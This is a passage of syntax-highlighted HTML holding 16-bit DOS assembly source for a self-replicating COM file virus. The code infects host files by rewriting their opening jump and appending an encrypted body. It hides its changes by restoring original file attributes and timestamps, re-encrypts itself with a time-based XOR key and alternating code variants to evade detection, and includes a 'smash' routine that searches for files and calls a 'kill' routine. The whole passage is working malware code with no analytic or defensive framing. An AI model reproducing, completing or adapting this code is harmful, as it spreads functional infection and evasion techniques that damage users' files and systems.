</span><span class="sc5">here</span><span class="sc4">:</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fileattr</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">origattr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                   
              </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">bad_file2</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">openfile</span><span class="sc0">
              </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">bad_file2</span><span class="sc0">                  

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filedate</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">origdate</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filetime</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">origtime</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

              </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                     

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3fh</span><span class="sc0">                   
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">oldjmp</span><span class="sc4">]</span><span class="sc0">         
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                        

              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldjmp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">myid</span><span class="sc0">
              </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">sick_of_it_all</span><span class="sc0">             
              
</span><span class="sc5">bad_file</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                   
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">origattr</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                    
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                       

</span><span class="sc5">bad_file2</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">                   
              </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dumb</span><span class="sc0">                       
              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">                    
              </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">dumb</span><span class="sc0">                      
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4fh</span><span class="sc0">                    
              </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">searchloop</span><span class="sc0">                
</span><span class="sc5">dumb</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">nofilesfound</span><span class="sc0">             

</span><span class="sc5">sick_of_it_all</span><span class="sc4">:</span><span class="sc0">

              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldjmp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5a4dh</span><span class="sc0">  
              </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bad_file</span><span class="sc0">                 

              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seekeof</span><span class="sc0">

              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">                  
              </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">bad_file</span><span class="sc0">                   
              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">toolarge</span><span class="sc0">             
              </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">bad_file</span><span class="sc0">                   


              </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                     
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newjmp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">  
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newjmp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">       
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newjmp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">myid</span><span class="sc0">    
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">                  
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newjmp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">          

              </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                    
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">donebefore</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">     

              </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">generation</span><span class="sc4">]</span><span class="sc0"> 

              </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                    
              </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">enc_enc</span><span class="sc0">                   

</span><span class="sc5">tryagain</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                  
              </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">                       
              </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">               
              </span><span class="sc6">je</span><span class="sc0">       </span><span class="sc5">tryagain</span><span class="sc0">                 
              </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enc_code</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                                                

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                      
              </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                     
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutantcode</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0">                    
              </span><span class="sc6">jng</span><span class="sc0">     </span><span class="sc5">encrypt_a</span><span class="sc0">                
              </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">encrypt_b</span><span class="sc0">                  


</span><span class="sc5">encrypt_a</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc1">;mov     bp, si                    </span><span class="sc0">

              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part1</span><span class="sc4">]</span><span class="sc0">     
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part1_</span><span class="sc4">]</span><span class="sc0">   
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">part1size</span><span class="sc0">             
              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dostring</span><span class="sc0">                 
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part2</span><span class="sc4">]</span><span class="sc0">     
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">done_</span><span class="sc4">]</span><span class="sc0">     

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">part2size</span><span class="sc0">              
              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dostring</span><span class="sc0">

              </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">attach</span><span class="sc0">                    

</span><span class="sc5">encrypt_b</span><span class="sc4">:</span><span class="sc0">

              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">parta</span><span class="sc4">]</span><span class="sc0">     
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part1_</span><span class="sc4">]</span><span class="sc0">   
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">part1size</span><span class="sc0">            
              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dostring</span><span class="sc0">                   

              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">partb</span><span class="sc4">]</span><span class="sc0">     
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">done_</span><span class="sc4">]</span><span class="sc0">     
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">part2size</span><span class="sc0">              
              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dostring</span><span class="sc0">                  

</span><span class="sc5">attach</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">enc_enc</span><span class="sc0">                   

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                    
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bodyend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">bodystart</span><span class="sc0">    
              </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">bodystart</span><span class="sc4">]</span><span class="sc0">        
              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">                     
              </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">close_file</span><span class="sc0">               
                                                 

              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">seektof</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                     
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                      
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newjmp</span><span class="sc4">]</span><span class="sc0">    
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                        

</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">

              
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">                   
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">origtime</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">origdate</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">                   
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                  
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">origattr</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc5">nofilesfound</span><span class="sc4">:</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03bh</span><span class="sc0">                   
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">drive</span><span class="sc4">]</span><span class="sc0">    
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                       

</span><span class="sc5">restoredta</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1ah</span><span class="sc0">                    
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">                  
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                        
              </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                        

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">                  
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">oint24</span><span class="sc4">]</span><span class="sc0">         
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                       

              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">thisjmp</span><span class="sc4">]</span><span class="sc0">   
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                   

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                     
              </span><span class="sc6">cld</span><span class="sc0">                               
              </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                    

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">                  
              </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                         

</span><span class="sc5">smash</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">enc_enc</span><span class="sc0">                    
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4eh</span><span class="sc0">                    
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">                   
              </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dwildcards</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">r_loop</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                       
              </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">restoredta</span><span class="sc0">                 

              </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kill</span><span class="sc0">                      

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4fh</span><span class="sc0">                 
              </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">r_loop</span><span class="sc0">

</span><span class="sc5">smash</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">dostring</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

              </span><span class="sc6">cld</span><span class="sc0">                                
              </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                     
              </span><span class="sc6">ret</span><span class="sc0">                              

</span><span class="sc5">dostring</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">enc_enc</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">                     
              </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part1</span><span class="sc0">           
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                   
              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">total_mutant</span><span class="sc0">          

</span><span class="sc5">loop_xor</span><span class="sc4">:</span><span class="sc0">
              </span><span class="sc6">lodsw</span><span class="sc0">                              
              </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mutantcode</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
              </span><span class="sc6">stosw</span><span class="sc0">                              
              </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">loop_xor</span><span class="sc0">

